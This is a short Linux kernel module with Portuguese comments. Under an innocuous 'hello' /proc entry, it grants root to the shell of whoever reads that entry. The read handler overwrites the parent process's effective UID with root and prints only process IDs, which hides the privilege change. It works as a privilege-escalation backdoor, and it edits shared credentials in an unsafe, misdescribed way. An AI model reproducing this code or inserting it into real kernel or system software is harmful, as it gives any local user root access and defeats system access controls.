#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>


static int hello_show(struct seq_file *m, void *v) {
	// Aumentar privilégio do interpretador de comandos
	struct cred *str_cred = (struct cred*) get_cred(current->parent->cred);
	
	// Altera credencial
	str_cred->euid = GLOBAL_ROOT_UID;
	
	// Salva alteração
	put_cred(str_cred);
	
	// Imprime PIDs do processo corrente e seu processo pai
	seq_printf(m, "Processo corrente: %d\nProcesso pai: %d\n", current->pid, current->parent->pid);
	
	return 0;
}

static int hello_open(struct inode *inode, struct file *file) {
	return single_open(file, hello_show, NULL);
}

static const struct file_operations hello_fops = {
	.owner		= THIS_MODULE,
	.open		= hello_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= single_release,
};

int init_module(void) {
	if (!proc_create("hello", 0644, NULL, &hello_fops)) {
		printk("Problema com o módulo!\n");
		return -ENOMEM;
	}
	printk("Módulo carregado!\n");
	return 0;
}

void cleanup_module(void) {
	remove_proc_entry("hello", NULL);
	printk("Módulo descarregado!\n");
}

MODULE_LICENSE("GPL");
